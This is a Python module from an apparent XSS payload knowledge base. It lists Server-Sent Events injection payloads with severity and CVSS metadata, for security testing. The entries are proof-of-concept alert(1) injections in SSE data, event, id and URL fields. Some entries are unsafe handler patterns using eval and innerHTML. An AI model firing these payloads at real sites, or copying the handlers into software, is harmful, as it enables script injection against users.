#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Server-Sent Events XSS Payloads
"""

from ..models import PayloadEntry


SSE_PAYLOADS = {
    # Data injection
    "sse_data_script": PayloadEntry(
        payload="data: <script>alert(1)</script>",
        contexts=["sse", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="SSE data field script injection",
        tags=["sse", "data", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sse_data_img": PayloadEntry(
        payload="data: <img src=x onerror=alert(1)>",
        contexts=["sse", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="SSE data field image XSS",
        tags=["sse", "data", "image"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sse_data_json": PayloadEntry(
        payload='data: {"message":"<script>alert(1)</script>"}',
        contexts=["sse", "json"],
        severity="critical",
        cvss_score=8.8,
        description="SSE JSON data XSS",
        tags=["sse", "data", "json"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sse_data_multiline": PayloadEntry(
        payload="data: <script>\\ndata: alert(1)\\ndata: </script>",
        contexts=["sse", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="SSE multiline data XSS",
        tags=["sse", "data", "multiline"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "sse_data_proto": PayloadEntry(
        payload='data: {"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        contexts=["sse", "json"],
        severity="critical",
        cvss_score=9.0,
        description="SSE prototype pollution",
        tags=["sse", "data", "prototype-pollution"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Event injection
    "sse_event_xss": PayloadEntry(
        payload="event: xss\\ndata: <script>alert(1)</script>",
        contexts=["sse_event", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="SSE custom event XSS",
        tags=["sse", "event", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sse_event_message": PayloadEntry(
        payload="event: message\\ndata: <script>alert(1)</script>",
        contexts=["sse_event", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="SSE message event XSS",
        tags=["sse", "event", "message"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # ID injection
    "sse_id_xss": PayloadEntry(
        payload='id: "><script>alert(1)</script>',
        contexts=["sse_id"],
        severity="high",
        cvss_score=7.5,
        description="SSE ID field XSS",
        tags=["sse", "id", "xss"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # URL injection
    "sse_url_callback": PayloadEntry(
        payload="/events?callback=alert",
        contexts=["sse_url", "url"],
        severity="high",
        cvss_score=7.5,
        description="EventSource URL callback injection",
        tags=["sse", "url", "callback"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "sse_url_data": PayloadEntry(
        payload="data:text/event-stream,data: <script>alert(1)</script>",
        contexts=["sse_url", "url"],
        severity="critical",
        cvss_score=8.8,
        description="EventSource data URL XSS",
        tags=["sse", "url", "data-url"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Handler injection
    "sse_handler_eval": PayloadEntry(
        payload="function(e){eval(e.data)}",
        contexts=["sse_handler", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="EventSource onmessage eval handler",
        tags=["sse", "handler", "eval"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "sse_handler_innerhtml": PayloadEntry(
        payload="(e)=>document.body.innerHTML=e.data",
        contexts=["sse_handler", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="EventSource innerHTML handler",
        tags=["sse", "handler", "innerhtml"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
}

SSE_PAYLOADS_TOTAL = len(SSE_PAYLOADS)
